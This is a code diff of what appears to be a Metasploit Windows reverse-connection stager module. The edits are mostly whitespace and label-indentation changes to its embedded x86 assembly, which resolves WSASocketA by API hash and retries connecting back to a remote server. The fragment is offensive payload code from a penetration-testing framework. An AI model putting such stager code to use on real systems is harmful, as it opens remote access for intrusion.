@@ -47,7 +47,6 @@ module MetasploitModule
         #{asm_block_api}
         start:
           pop ebp
-        
         ; Input: EBP must be the address of 'api_call'.
         ; Output: EDI will be the socket for the connection to the server
         ; Clobbers: EAX, ESI, EDI, ESP will also be modified (-0x1A0)
@@ -85,7 +84,7 @@ module MetasploitModule
           push #{Rex::Text.block_api_hash('ws2_32.dll', 'WSASocketA')}
           call ebp                ; WSASocketA( AF_INET, SOCK_STREAM, 0, 0, 0, 0 );
           xchg edi, eax           ; save the socket for later, don't care about the value of eax after this
-        
+
         try_connect:
           push 16                 ; length of the sockaddr struct
           push esi                ; pointer to the sockaddr struct
@@ -100,10 +99,8 @@ module MetasploitModule
           ; decrement our attempt count and try again
           dec dword [esi+8]
           jnz try_connect
-        
-          failure:
-            call exitfunk
-          
+        failure:
+          call exitfunk
           ; this  lable is required so that reconnect attempts include
           ; the UUID stuff if required.
         connected:
@@ -142,13 +139,10 @@ module MetasploitModule
           pop esi
           dec [esi+8]               ; decrement the retry counter
           jmp exitfunk
-
           ; try again
           jnz create_socket
           jmp failure
-          
         exitfunk:
-
           mov ebx, 0x56a2b5f0
           push.i8 0              ; push the exit function parameter
           push ebx               ; push the hash of the exit function
